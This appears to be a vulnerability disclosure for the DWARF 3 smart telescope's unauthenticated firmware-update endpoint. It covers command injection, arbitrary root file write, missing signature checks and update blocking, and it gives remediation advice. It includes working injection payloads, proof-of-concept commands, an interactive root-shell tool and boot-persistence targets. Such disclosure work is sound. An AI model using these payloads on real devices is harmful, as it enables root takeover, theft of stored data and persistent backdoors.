# DWARF 3 — Unauthenticated Remote Root Compromise via the OTA Update Endpoint

Security research against the **DWARF 3** smart telescope (DwarfLab). The
device exposes an unauthenticated firmware-update endpoint that can be driven
to arbitrary file write and OS command execution **as root**, with no
signature verification anywhere in the update path.

> Verified on a physical device the author owns. All analysis is against
> firmware the vendor publishes. No third-party systems were touched.

---

## Summary

`POST /uploadFirmwareDiff` on TCP **8082** accepts a firmware package from any
host that can reach the device, with **no authentication and no cryptographic
verification**. Attacker-controlled fields from the request are used to build
shell commands and filesystem destinations, yielding:

* **remote code execution as `uid=0(root)`** (confirmed), and
* **arbitrary file write as root, with the executable bit set on request**.

Five distinct issues are documented below. Issues 1–3 are individually
sufficient for full device compromise.

| # | Issue | CWE | Severity |
|---|-------|-----|----------|
| 1 | OS command injection via OTA version fields → RCE as root | CWE-78 | Critical |
| 2 | Arbitrary file write as root via `target_path` (+ `chmod +x`) | CWE-73 / CWE-22 | Critical |
| 3 | No authentication and no signature verification on firmware update | CWE-306 / CWE-347 | Critical |
| 4 | Failed upgrade reports success (unchecked `bspatch` result) | CWE-393 / CWE-252 | Medium |
| 5 | Unauthenticated persistent firmware-version inflation (update DoS) | CWE-306 | Medium |

---

## Affected

| | |
|---|---|
| **Vendor** | DwarfLab |
| **Product** | DWARF 3 smart telescope |
| **Component** | `magni` (main application daemon, ARM aarch64), HTTP API on TCP 8082 |
| **Confirmed affected** | firmware **1.5.4.3** (device under test); static analysis against the published **1.5.4.1** package |
| **Expected affected** | the whole 1.5.4.x line, and likely earlier — the endpoint predates these versions |
| **Fixed in** | no fixed version known at time of writing |
| **Attack vector** | network access to the device (its own Wi-Fi AP, or the LAN it joined) |
| **Privileges required** | none |
| **User interaction** | none |

### Prior work / relationship to the earlier finding

An earlier path-traversal issue in this same endpoint — `fileName` containing
`../` to overwrite `/etc/vsftpd.conf` — was reported separately against
firmware 1.4.7.5
([DWARF-3-Root-Exploit](https://github.com/Jaarden/DWARF-3-Root-Exploit)).

**That issue is fixed in 1.5.4.x.** The multipart `filename=` is now rejected
if it contains `/`, `\` or `..` (`magni` `0x841238`–`0x841360`), and the JSON
`fileName` is passed through a whitelist sanitiser that keeps only
`[A-Za-z0-9._-]` and replaces every other byte with `_` (`0x7f4b00`).

The issues in this document are **different bugs in the same endpoint** and are
not blocked by that fix. They warrant separate CVE IDs.

---

## Technical background

The endpoint takes `multipart/form-data` with two parts:

* a field named **`firmwareInfo`** holding `{"data": { ... }}` — the update
  metadata, and
* a file part holding the firmware package (ZIP).

The metadata fields are read at `0x8223e8`ff:

```
deviceId  fileMd5  fullFileMd5  fileName  updateFileType  updateType
newVersion  oldVersion
```

`updateFileType` selects the install mode:

* `1` → **diff mode**: the upload is fed to `bspatch` as a patch file.
* `0`, `2`, `3` → **full upgrade**: the upload is treated as the package and
  installed.

Install is performed by `upgradeSoftwareLegacy`, reached from the request
handler at `0x7f63c8` via the thunk at `0x9b2dc0`. It builds shell commands by
string concatenation and executes them through
`posix_spawn("/bin/sh", ["-c", cmd])` at `0x9d2340`
(`"/bin/sh"` @ `0xd9aa40`, `"-c"` @ `0xd9aa48`):

```c
cmd = "cp " + src + " " + dst;            // 0x9b140c, separator " " @ 0xda3680
cmd = "bspatch " + old + " " + new + ...  // 0x9b2464
```

Note the HTTP route strings are single-byte XOR-obfuscated in `.rodata`
(`/uploadFirmwareDiff` at `0xd5e4b8`, key `0xc5`, registered at `0x7f1cb8`), so
they do not appear in a plain `strings` dump. This is obfuscation, not a
security control.

---

## Issue 1 — OS command injection via OTA version fields (RCE as root)

**CWE-78** · Improper Neutralization of Special Elements used in an OS Command
**CVSS v3.1 9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
(use `AV:A` → 8.8 if your CNA scores Wi-Fi-local reachability as Adjacent)

`newVersion` and `oldVersion` are taken verbatim from the request JSON and
concatenated **unquoted** into the command strings above. Unlike `fileName`,
they are not sanitised.

The version gate at `0x9b0e04` parses only the numeric prefix (a
`stringstream` parse at `0x9b5040`), so a value such as

```
1.5.4.19; id > /DWARF3/himom; #
```

passes validation as `1.5.4.19` while the remainder survives into the shell
command:

```sh
cp <src> /usrdata/firmware/dwarf3_upgrade_firmware_v1.5.4.19; id > /DWARF3/himom; #.zip
```

`cp` runs, then the injected command runs, then `#` comments out the tail.

### Confirmation

```console
$ python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3 \
      --inject-field new --inject 'id > /DWARF3/himom'
[*] POST http://<ip>:8082/uploadFirmwareDiff
[*] HTTP 200: { "code": -15 }

$ curl -s http://<ip>/DWARF3/himom
uid=0(root) gid=0(root)
```

The non-zero OTA response code is a *downstream* symptom: the injected command
has already executed by the time the install fails. Output is read back over
the device's own webserver, which serves `/DWARF3` with `autoindex on`
(`location /DWARF3 { root /; autoindex on; }` in `nginx.conf`).

`dwarf3_shell.py` turns this into an interactive root shell.

---

## Issue 2 — Arbitrary file write as root via `target_path`

**CWE-73** External Control of File Name or Path (also **CWE-22**)
**CVSS v3.1 9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

In full-upgrade mode the package is extracted and each module directory
(`iq`, `bin`, `libs`, `config`, `mcu`, `model`) is scanned for an
`update.json` manifest, parsed at `0x9abf70`:

```json
{ "fileInfo": [ { "name": "payload",
                  "target_path": "/any/absolute/path",
                  "is_directory": false,
                  "need_execute": 1 } ] }
```

`target_path` is **fully attacker-controlled and unvalidated** — no allowlist,
no canonicalisation, no `realpath()`. The `".."` literal at `0xd65990` is
referenced only by the multipart filename checks, never by the installer
(`0x9a8000`–`0x9b3000`). `need_execute: 1` makes the installer `chmod +x` the
written file.

### Confirmation

```console
$ python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3 --update-file-type 0
[*] HTTP 200: { "code": 0 }
[+] installed: /DWARF3/poc_marker

$ curl -s http://<ip>/DWARF3/ | grep poc_marker
<a href="poc_marker">poc_marker</a>    01-Jan-2038 00:21    23
```

### Escalation to persistent root execution

The vendor's own manifest ships these entries, so both are documented install
targets:

```json
{ "name": "run.sh",                 "target_path": "/usrdata", "need_execute": 1 }
{ "name": "usb_gadget_configfs.sh", "target_path": "/etc",     "need_execute": 1 }
```

`/usrdata/run.sh` is the device boot script and invokes
`/etc/usb_gadget_configfs.sh` as root at every boot. Writing either yields
persistent root code execution that survives reboot.

---

## Issue 3 — No authentication, no signature verification

**CWE-306** Missing Authentication for Critical Function
**CWE-347** Improper Verification of Cryptographic Signature
**CVSS v3.1 9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

* The HTTP API on 8082 has **no authentication of any kind**. `magni` contains
  no `Authorization`, `Bearer`, `WWW-Authenticate` or `Unauthorized` strings,
  and no libhv request preprocessor is installed.
* Firmware packages are **not signed**. No `EVP_DigestVerify`, `ECDSA_verify`,
  `signature` or `pubkey` handling exists in the update path.
* The only integrity check is an **MD5 supplied by the client in the same
  request** (`fileMd5` / `fullFileMd5`), which provides no authenticity
  guarantee whatsoever.

Any host that can reach the device can therefore install arbitrary firmware.

---

## Issue 4 — Failed upgrade reports success

**CWE-393** Return of Wrong Status Code · **CWE-252** Unchecked Return Value
**CVSS v3.1 5.3 Medium** — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`

In diff mode the patch command is built as:

```
bspatch <old>.zip  /tmp/<new>.zip  /tmp/<new>.zip
            old       newfile          patchfile
```

`newfile` and `patchfile` are **the same path**, so `bspatch` truncates the
patch file while still reading it. The exit status is never checked, nothing is
logged, and the handler returns `code: 0` to the client while the device logs:

```
[ERROR][upgradeSoftwareLegacy] Directory not found: iq
[ERROR][upgradeSoftwareLegacy] Directory not found: bin
...
[INFO][completeFirmwareUploadResponse] OTA response: code=0 stage=upgrade
```

A failed update is indistinguishable from a successful one to any client,
and the firmware version is still committed.

---

## Issue 5 — Unauthenticated persistent version inflation

**CWE-306** Missing Authentication for Critical Function
**CVSS v3.1 6.5 Medium** — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

Every accepted upload writes `newVersion` into
`/userdata/config/factory/firmware_version.json` — including uploads whose
install fails. The value is never validated against anything authoritative.

The version gate at `0x9b0e04` rejects any package that is not strictly newer
than the stored version. An attacker can therefore set the stored version
arbitrarily high (e.g. `9.9.9.9`) and **permanently prevent the device from
accepting legitimate vendor updates**, without authentication and with no
user-visible indication beyond the reported version string.

During testing the device under test was driven from 1.5.4.3 to 1.5.4.18 by
repeated uploads.

---

## Exploit chain

```
POST /uploadFirmwareDiff            (TCP 8082, unauthenticated)
  multipart/form-data
    part "firmwareInfo"  = {"data": {deviceId, fileMd5, fullFileMd5,
                                     fileName, updateFileType, updateType,
                                     newVersion, oldVersion}}
    part file            = ZIP package
         │
         ├─ oldVersion == device version, newVersion strictly greater   (0x9b0e04)
         ├─ updateFileType ∈ {0,2,3}  → full-upgrade branch
         ├─ ZIP needs explicit directory entries for the six modules
         │      (libzip only mkdir()s for explicit entries)
         │
         ├─[1]─ version fields → unquoted shell command → /bin/sh -c    → RCE root
         └─[2]─ <module>/update.json target_path → arbitrary write      → root write
                need_execute: 1 → chmod +x → boot persistence
```

---

## Tooling

| File | Purpose |
|---|---|
| `dwarf3_targetpath_poc.py` | single-shot PoC: arbitrary file write and/or command injection |
| `dwarf3_shell.py` | interactive root shell (probes for a working injection path, output via the device webserver) |

```bash
# arbitrary write, harmless marker
python3 dwarf3_targetpath_poc.py <ip> --target /DWARF3

# command injection
python3 dwarf3_targetpath_poc.py <ip> --inject-field new --inject 'id > /DWARF3/himom'
curl -s http://<ip>/DWARF3/himom

# interactive root shell
python3 dwarf3_shell.py <ip>
```

Both are stdlib-only Python 3.

---

## Impact

An attacker on the same network as the device can, without credentials:

* execute arbitrary commands as **root**;
* read and exfiltrate all stored media and configuration;
* install a persistent backdoor that survives reboot;
* replace the firmware with an arbitrary image (no signature check);
* permanently block legitimate firmware updates.

The DWARF 3 operates its own Wi-Fi access point by default and is also commonly
joined to a home network, so reachability is the normal operating condition
rather than an unusual one.

---

## Recommended remediation

1. **Authenticate the update endpoint.** The whole 8082 API is currently
   unauthenticated; at minimum the OTA endpoint must require a device-bound
   credential.
2. **Sign firmware packages** and verify the signature with a vendor public key
   before any file is written or any command is run. A client-supplied MD5 is
   not an integrity control.
3. **Never build shell commands by string concatenation.** Replace the `cp` /
   `bspatch` `system`-style invocations with `posix_spawn`/`execve` passing an
   argument vector, or at minimum shell-quote every interpolated value.
4. **Validate `target_path`**: resolve with `realpath()` and reject anything
   outside an explicit install-root allowlist. Apply the same treatment to
   `name`.
5. **Validate the version fields** against a strict `^\d+(\.\d+){3}$` regex and
   reject anything else, rather than parsing a numeric prefix and ignoring the
   rest.
6. **Check return values.** `bspatch` must not be invoked with identical
   `newfile` and `patchfile` paths, its exit status must be checked, and a
   failed upgrade must return an error and must not commit a version bump.
7. **Do not commit the firmware version** until the install has actually
   succeeded and been verified.

---

## Disclosure

| Date | Event |
|---|---|
| _TBD_ | Vendor notified |
| _TBD_ | Vendor acknowledgement |
| _TBD_ | Fix released |
| _TBD_ | Public disclosure |

Reported by **Justin Aarden**.

Earlier related finding (path traversal, fixed in 1.5.4.x):
<https://github.com/Jaarden/DWARF-3-Root-Exploit>

---

## Legal and ethical note

All testing was carried out against a DWARF 3 owned by the author, on an
isolated network. No third-party devices were accessed. This material is
published for defensive and remediation purposes.
